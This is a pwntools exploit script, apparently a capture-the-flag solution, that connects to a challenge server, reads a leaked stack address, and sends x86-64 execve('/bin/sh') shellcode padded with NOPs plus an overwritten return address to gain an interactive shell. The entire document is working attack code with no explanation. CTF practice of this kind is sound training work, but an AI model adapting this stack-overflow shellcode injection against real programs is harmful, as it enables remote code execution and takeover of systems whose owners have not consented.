from pwn import *

elf = context.binary = ELF("./chal")
context.arch='amd64'
#io = process("./chal")
io = remote("where.harkonnen.b01lersc.tf",8443,ssl=True,sni=True)

#gdb.attach(io,gdbscript="""
#           break *main+103
#           """)

# for test return
main = 0x00000000004011dd

# Get address
io.recvuntil(b"Quincy says somewhere around here might be fun... ")
stack_addr = int(io.recvline().strip(),16)
buffer_addr = stack_addr + 0x8

# NX
byteList = [0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05]
sh = bytes(byteList)
payload = sh.ljust(40,b"\x90") + p64(buffer_addr)
io.sendline(payload)
io.interactive()
